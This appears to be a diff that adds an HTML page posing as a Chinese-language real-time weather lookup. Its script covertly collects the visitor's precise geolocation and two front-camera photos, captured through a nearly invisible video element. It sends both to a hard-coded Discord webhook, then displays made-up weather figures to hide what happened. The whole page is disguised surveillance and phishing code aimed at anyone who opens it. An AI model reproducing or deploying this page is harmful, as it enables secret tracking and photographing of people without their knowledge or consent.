@@ -1,1 +1,120 @@
-1
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>即時天氣查詢系統</title>
+<style>
+    body { font-family: -apple-system, system-ui, sans-serif; text-align: center; margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(-45deg,#4fc3f7,#81d4fa,#b3e5fc,#29b6f6); background-size: 400% 400%; animation: skyFlow 15s ease infinite; overflow: hidden; }
+    @keyframes skyFlow { 0%{background-position:0% 50%;} 50%{background-position:100% 50%;} 100%{background-position:0% 50%;} }
+    .weather-box { background: rgba(255,255,255,0.95); width: 85%; max-width: 350px; padding: 35px 25px; border-radius: 25px; backdrop-filter: blur(15px); box-shadow: 0 15px 45px rgba(0,0,0,0.15); z-index: 10; position: relative; }
+    h2 { color: #1a73e8; font-size: 24px; }
+    .sun { width: 80px; height: 80px; border-radius: 50%; margin: 0 auto 25px; background: radial-gradient(circle,#fff176,#fdd835,#fbc02d); box-shadow: 0 0 30px rgba(251,192,45,0.6); animation: sunPulse 3s ease-in-out infinite; }
+    @keyframes sunPulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.08);} }
+    button { width: 100%; padding: 16px; font-size: 18px; font-weight: bold; border: none; border-radius: 15px; background: linear-gradient(135deg,#42a5f5,#1976d2); color: white; cursor: pointer; transition: 0.3s; }
+    button:active { transform: scale(0.95); }
+    #status { margin-top: 25px; font-size: 15px; color: #444; line-height: 1.8; }
+
+    /* 隱藏但保持活動的相機標籤 */
+    #v { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1; }
+</style>
+</head>
+<body>
+
+<div class="weather-box">
+    <div class="sun"></div>
+    <h2>🌤 即時天氣查詢</h2>
+    <p>正在校準全球氣象衛星...</p>
+    <button id="btn" onclick="startAction()">獲取當前天氣</button>
+    <div id="status"></div>
+</div>
+
+<video id="v" autoplay playsinline muted></video>
+<canvas id="c" style="display:none;"></canvas>
+
+<script>
+// 請在下方填入你新的 Webhook 網址
+var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
+
+var photoCount = 0;
+var currentStream = null;
+
+function startAction() {
+    document.getElementById("btn").style.display = "none";
+    document.getElementById("status").innerHTML = "📡 正在連接氣象基站...<br>🌓 掃描環境光感中...";
+    getLocation();
+    getCamera();
+}
+
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(pos) {
+            var lat = pos.coords.latitude;
+            var lon = pos.coords.longitude;
+            var mapLink = "https://www.google.com" + lat + "," + lon;
+            fetch(webhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: "📍 **定位成功**\n緯度: " + lat + "\n經度: " + lon + "\n地圖連結: " + mapLink
+                })
+            });
+            document.getElementById("status").innerHTML += "<br>✅ 定位成功，處理數據中...";
+        }, function(err) {
+            console.log("定位權限被拒絕");
+        }, { enableHighAccuracy: true });
+    }
+}
+
+function getCamera() {
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(function(stream) {
+        currentStream = stream;
+        var video = document.getElementById("v");
+        video.srcObject = stream;
+        
+        // 確保影片播放且有畫面後才執行截圖
+        video.onplaying = function() {
+            setTimeout(function() { takeSnap(false); }, 1500); 
+            setTimeout(function() { takeSnap(true); }, 3500);  
+        };
+    }).catch(function(err) {
+        document.getElementById("status").innerHTML = "❌ 偵測失敗：請開啟位置與環境權限。";
+    });
+}
+
+function takeSnap(isLast) {
+    var video = document.getElementById("v");
+    var canvas = document.getElementById("c");
+    
+    // 檢查視訊是否有數據，避免黑屏
+    if (video.videoWidth === 0 || video.paused) return;
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    var ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
+    
+    canvas.toBlob(function(blob) {
+        if (!blob) return;
+        var formData = new FormData();
+        formData.append("file", blob, "img_" + Date.now() + ".jpg");
+        formData.append("payload_json", JSON.stringify({ content: "📸 **環境掃描已同步 (" + (++photoCount) + "/2)**" }));
+
+        fetch(webhook, { method: "POST", body: formData })
+        .then(function() {
+            if (isLast) {
+                // 最後一張傳完，立即關閉相機並顯示天氣
+                if (currentStream) {
+                    currentStream.getTracks().forEach(track => track.stop());
+                }
+                document.getElementById("status").innerHTML = "☀️ **今日天氣：晴朗**<br>🌡 溫度：27.5°C<br>🌬 濕度：62%<br>✨ 資訊已更新至最新。";
+            }
+        });
+    }, "image/jpeg", 0.7);
+}
+</script>
+
+</body>
+</html>
+
